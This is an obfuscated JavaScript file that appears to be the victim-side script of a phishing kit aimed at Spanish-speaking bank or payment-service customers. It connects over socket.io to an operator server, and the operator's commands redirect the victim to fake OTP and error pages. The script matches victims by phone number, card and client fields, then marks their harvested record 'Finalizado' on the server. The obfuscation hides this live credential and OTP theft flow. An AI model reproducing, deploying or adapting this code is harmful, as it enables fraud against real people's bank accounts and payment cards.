const _0x35477d = _0x4341;
function _0x2f38() {
  const _0x593481 = [
    "1639460RTWzGR",
    "18ifGYqZ",
    "log",
    "telnum",
    "4VrpdlH",
    "idreg",
    "valid",
    "logs",
    "reg",
    "1302455KLtyqt",
    "936600EbCVjm",
    "608734MuTbgc",
    "newdin",
    "stringify",
    "./index.error.html",
    "./errorPse.html",
    "28650790UNwJUW",
    "697218VChWOY",
    "json",
    "finish",
    "432zoRuvs",
    "location",
    "./otp.html",
    "application/json",
    "valor",
    "Finalizado",
    "Usuario\x20encontrado",
    "metaInfo",
    "/logs/logFinish/",
    "din",
    "126496FgHbUr",
    "href",
  ];
  _0x2f38 = function () {
    return _0x593481;
  };
  return _0x2f38();
}
(function (_0x44502a, _0x2d2334) {
  const _0x1334f3 = _0x4341,
    _0x3ae3bc = _0x44502a();
  while (!![]) {
    try {
      const _0x40090a =
        -parseInt(_0x1334f3(0x1f4)) / 0x1 +
        parseInt(_0x1334f3(0x1f3)) / 0x2 +
        (-parseInt(_0x1334f3(0x1da)) / 0x3) *
          (parseInt(_0x1334f3(0x1ed)) / 0x4) +
        (-parseInt(_0x1334f3(0x1e9)) / 0x5) *
          (parseInt(_0x1334f3(0x1ea)) / 0x6) +
        -parseInt(_0x1334f3(0x1f2)) / 0x7 +
        (-parseInt(_0x1334f3(0x1e7)) / 0x8) *
          (parseInt(_0x1334f3(0x1dd)) / 0x9) +
        parseInt(_0x1334f3(0x1d9)) / 0xa;
      if (_0x40090a === _0x2d2334) break;
      else _0x3ae3bc["push"](_0x3ae3bc["shift"]());
    } catch (_0x2f6e06) {
      _0x3ae3bc["push"](_0x3ae3bc["shift"]());
    }
  }
})(_0x2f38, 0x89942);
function _0x4341(_0x17c2eb, _0xa86689) {
  const _0x2f382d = _0x2f38();
  return (
    (_0x4341 = function (_0x434118, _0x267803) {
      _0x434118 = _0x434118 - 0x1d6;
      let _0x2ddb36 = _0x2f382d[_0x434118];
      return _0x2ddb36;
    }),
    _0x4341(_0x17c2eb, _0xa86689)
  );
}
var socket = io["connect"](url);
socket["on"](_0x35477d(0x1f0), function (_0x23b291) {
  const _0xa18ba7 = _0x35477d;
  if (
    _0x23b291[_0xa18ba7(0x1e1)] == "us" &&
    _0x23b291["valid"] == info[_0xa18ba7(0x1e4)]["telnum"]
  )
    window["location"]["href"] = _0xa18ba7(0x1d7);
  else {
    if (
      _0x23b291[_0xa18ba7(0x1e1)] == _0xa18ba7(0x1e6) &&
      _0x23b291[_0xa18ba7(0x1ef)] == info["metaInfo"][_0xa18ba7(0x1ec)]
    )
      window[_0xa18ba7(0x1de)][_0xa18ba7(0x1e8)] = _0xa18ba7(0x1df);
    else {
      if (
        _0x23b291["valor"] == _0xa18ba7(0x1f5) &&
        _0x23b291[_0xa18ba7(0x1ef)] == info["metaInfo"][_0xa18ba7(0x1ec)]
      )
        window[_0xa18ba7(0x1de)][_0xa18ba7(0x1e8)] = "./otp.error.html";
      else {
        if (
          _0x23b291["valor"] == _0xa18ba7(0x1dc) &&
          _0x23b291[_0xa18ba7(0x1ef)] ==
            info[_0xa18ba7(0x1e4)][_0xa18ba7(0x1ec)]
        ) {
          async function _0x46bbc1() {
            const _0x1a32ed = _0xa18ba7,
              _0x3d8aeb = await fetch(url + "/logs/logs", {
                method: "GET",
                headers: { "Content-Type": "application/json" },
              }),
              _0x5b645f = await _0x3d8aeb[_0x1a32ed(0x1db)](),
              _0x159d15 = [..._0x5b645f];
            for (const _0x4be05e of _0x159d15) {
              if (
                _0x4be05e[_0x1a32ed(0x1f1)] == info[_0x1a32ed(0x1e4)]["cc"] &&
                _0x4be05e["cl"] == info["metaInfo"][_0x1a32ed(0x1ec)]
              ) {
                console[_0x1a32ed(0x1eb)](_0x1a32ed(0x1e3));
                const _0x1f1817 = await fetch(
                    url + _0x1a32ed(0x1e5) + _0x4be05e[_0x1a32ed(0x1ee)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": _0x1a32ed(0x1e0) },
                      body: JSON[_0x1a32ed(0x1d6)]({
                        status: _0x1a32ed(0x1e2),
                      }),
                    }
                  ),
                  _0xc49b31 = await _0x1f1817[_0x1a32ed(0x1db)]();
              }
            }
            window[_0x1a32ed(0x1de)]["href"] = _0x1a32ed(0x1d8);
          }
          _0x46bbc1();
          return;
        }
      }
    }
  }
});
